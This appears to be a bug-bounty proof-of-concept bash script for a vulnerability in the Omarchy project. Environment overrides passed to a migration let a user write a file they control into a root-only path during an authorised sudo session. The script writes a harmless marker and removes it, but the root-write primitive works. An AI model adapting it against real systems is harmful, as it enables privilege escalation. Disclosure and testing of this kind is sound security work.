#!/usr/bin/env bash
set -euo pipefail

# HackerOne PoC for Omarchy quattro.
# Demonstrates that user-controlled OMARCHY_FPRINTD_* environment overrides
# reach migration 1791125650.sh and are used as operands to sudo install,
# allowing a caller-controlled regular file to be installed into a root-only
# destination while the migration runs under an authorized sudo session.
#
# The PoC intentionally writes only a harmless marker under /root and removes it.
# It does not install a systemd hook, modify PAM, or create persistence.

TARGET_REPO="https://github.com/omacom/omarchy.git"
TARGET_REF="${TARGET_REF:-65c0f3306e9b4af676f32d3b9fa187b53d9ca155}"
TARGET_MIGRATION="1791125650.sh"

work="$(mktemp -d)"
root_dest="/root/omarchy-h1-poc-${GITHUB_RUN_ID:-$$}"

cleanup() {
  sudo rm -f -- "$root_dest" 2>/dev/null || true
  rm -rf -- "$work"
}
trap cleanup EXIT

echo "[+] cloning Omarchy at $TARGET_REF"
git clone -q --filter=blob:none --no-checkout "$TARGET_REPO" "$work/omarchy"
git -C "$work/omarchy" fetch -q --depth=1 origin "$TARGET_REF"
git -C "$work/omarchy" checkout -q --detach FETCH_HEAD

repo="$work/omarchy"
migration="$repo/migrations/$TARGET_MIGRATION"
migrator="$repo/bin/omarchy-migrate"
security_functions="$repo/bin/omarchy-security-functions"
update="$repo/bin/omarchy-update"

[[ -f "$migration" ]] || { echo "[-] target migration missing"; exit 1; }
[[ -x "$migrator" ]] || { echo "[-] migrator missing"; exit 1; }

echo "[+] verifying vulnerable dataflow still exists"
grep -F 'hook_src="${OMARCHY_FPRINTD_RESUME_SRC:-$OMARCHY_PATH/default/systemd/system-sleep/fprintd-resume}"' "$migration" >/dev/null
grep -F 'hook_dst="${OMARCHY_FPRINTD_RESUME_DST:-/usr/lib/systemd/system-sleep/fprintd-resume}"' "$migration" >/dev/null
grep -F 'lock_pam="${OMARCHY_LOCK_FINGERPRINT_PAM:-/etc/pam.d/omarchy-lock-fingerprint}"' "$migration" >/dev/null
grep -F 'sudo install -Dm755 "$hook_src" "$hook_dst"' "$migration" >/dev/null
grep -F 'omarchy-migrate' "$update" >/dev/null

sanitize_body="$(sed -n '/^omarchy_security_sanitize_bash_environment()/,/^}/p' "$security_functions")"
if grep -q 'OMARCHY_FPRINTD_' <<<"$sanitize_body"; then
  echo "[-] sanitizer now strips OMARCHY_FPRINTD_*; candidate appears fixed"
  exit 1
fi

echo "[+] preparing attacker-controlled source and migration gate"
payload="$work/user-controlled-payload"
printf '%s\n' 'OMARCHY_H1_POC_PAYLOAD_v1' >"$payload"
chmod 0644 "$payload"

# The migration only checks -f on this value before entering the privileged
# install branch. It does not require the real PAM file when an override is set.
fake_lock_pam="$work/user-controlled-lock-pam"
printf '%s\n' '# harmless PoC gate' >"$fake_lock_pam"

# Mark every other migration complete so the real omarchy-migrate runner executes
# only the target migration. This keeps the reproduction deterministic.
state="$work/migration-state"
mkdir -p "$state"
for f in "$repo"/migrations/*.sh; do
  touch "$state/$(basename "$f")"
done
rm -f "$state/$TARGET_MIGRATION"

# Keep the stop-timeout branch inert; the PoC needs only the first privileged
# install to demonstrate the root-write primitive.
missing_stop_src="$work/does-not-exist-stop-source"
missing_stop_dst="$work/does-not-exist-stop-destination"

echo "[+] establishing the sudo authorization that Omarchy update normally keeps alive"
sudo -k || true
sudo -v

echo "[+] invoking the real Omarchy migrator with attacker-controlled overrides"
OMARCHY_PATH="$repo" \
OMARCHY_MIGRATION_STATE="$state" \
OMARCHY_LOCK_FINGERPRINT_PAM="$fake_lock_pam" \
OMARCHY_FPRINTD_RESUME_SRC="$payload" \
OMARCHY_FPRINTD_RESUME_DST="$root_dest" \
OMARCHY_FPRINTD_STOP_TIMEOUT_SRC="$missing_stop_src" \
OMARCHY_FPRINTD_STOP_TIMEOUT_DST="$missing_stop_dst" \
PATH="$repo/bin:/usr/bin:/bin" \
  "$migrator"

echo "[+] verifying root-owned publication"
sudo test -f "$root_dest"
sudo cmp -s "$payload" "$root_dest"

meta="$(sudo stat -c '%u:%g:%a' "$root_dest")"
[[ "$meta" == "0:0:755" ]] || {
  echo "[-] unexpected owner/mode: $meta"
  exit 1
}

echo "PASS: user-controlled bytes were installed at a root-only destination"
echo "TARGET_REF=$TARGET_REF"
echo "DEST=$root_dest"
echo "OWNER_GROUP_MODE=$meta"
echo "BYTES=$(sudo cat "$root_dest")"
